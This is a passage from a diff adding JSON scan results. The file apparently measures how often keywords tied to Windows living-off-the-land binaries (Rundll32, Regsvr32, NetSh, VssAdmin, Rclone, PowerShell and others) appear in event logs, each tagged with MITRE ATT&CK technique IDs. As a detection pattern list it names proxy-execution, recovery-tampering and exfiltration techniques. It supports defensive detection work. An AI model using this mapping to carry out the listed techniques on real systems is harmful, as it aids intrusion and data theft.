+      "term": "regsvcs.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "REGSVR"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "remote:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "RemoteSigned"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "VssAdmin",
+      "techniques": [
+        "T1490",
+        "T1070"
+      ],
+      "term": "resize shadowstorage"
+    },
+    {
+      "events_hit": 116,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "restore"
+    },
+    {
+      "events_hit": 5,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "routing"
+    },
+    {
+      "events_hit": 142,
+      "file_rate": 0.0146,
+      "files_hit": 15,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "rpc"
+    },
+    {
+      "events_hit": 1493,
+      "file_rate": 0.0497,
+      "files_hit": 51,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "run"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BcdEdit",
+      "techniques": [
+        "T1490",
+        "T1562.001"
+      ],
+      "term": "safeboot"
+    },
+    {
+      "events_hit": 17,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "save"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "ScriptBlock"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Regsvr32",
+      "techniques": [
+        "T1059.001",
+        "T1218.010"
+      ],
+      "term": "scrobj.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "sdset"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "sdshow"
+    },
+    {
+      "events_hit": 12,
+      "file_rate": 0.0058,
+      "files_hit": 6,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "send"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "service call"
+    },
+    {
+      "events_hit": 478,
+      "file_rate": 0.0205,
+      "files_hit": 21,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "session"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Set-ExecutionPolicy"
+    },
+    {
+      "events_hit": 6,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "setupapi.dll"
+    },
+    {
+      "events_hit": 22,
+      "file_rate": 0.0127,
+      "files_hit": 13,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "share"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "shdocvw.dll"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "shell32.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "HTML Help",
+      "techniques": [
+        "T1218.001",
+        "T1059.007"
+      ],
+      "term": "shortcut"
+    },
+    {
+      "events_hit": 132,
+      "file_rate": 0.0058,
+      "files_hit": 6,
+      "kind": "lolbin_arg",
+      "subject": "MSDT",
+      "techniques": [
+        "T1218.005",
+        "T1059.001"
+      ],
+      "term": "skip"
+    },
+    {
+      "events_hit": 17,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "sleep"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Start-Job"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Start-Process"
+    },
+    {
+      "events_hit": 7,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "statistics"
+    },
+    {
+      "events_hit": 141,
+      "file_rate": 0.0107,
+      "files_hit": 11,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "stop"
+    },
+    {
+      "events_hit": 295,
+      "file_rate": 0.0448,
+      "files_hit": 46,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "sync"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "sysdm.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "syssetup.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "System."
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "InstallUtil",
+      "techniques": [
+        "T1218.004",
+        "T1059.001"
+      ],
+      "term": "System.Configuration.Install"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "RegAsm",
+      "techniques": [
+        "T1218.009",
+        "T1059.001"
+      ],
+      "term": "System.EnterpriseServices"
+    },
+    {
+      "events_hit": 26,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "teredo"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "timedate.cpl"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "trace"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "unload"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Unrestricted"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "url.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Regsvr32",
+      "techniques": [
+        "T1059.001",
+        "T1218.010"
+      ],
+      "term": "urlmon.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "UsingTask"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": "vbscript:"
+    },
+    {
+      "events_hit": 298,
+      "file_rate": 0.038,
+      "files_hit": 39,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "view"
+    },
+    {
+      "events_hit": 196,
+      "file_rate": 0.0292,
+      "files_hit": 30,
+      "kind": "lolbin_arg",
+      "subject": "MavInject",
+      "techniques": [
+        "T1055.001",
+        "T1218.013"
+      ],
+      "term": "virtual"
+    },
+    {
+      "events_hit": 27,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "wfp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "winsock"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "wlan"
+    },
+    {
+      "events_hit": 6,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "workstation"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "zipfldr.dll"
+    }
+  ],
+  "unreadable": [],
+  "wall_s": 102.7
+}
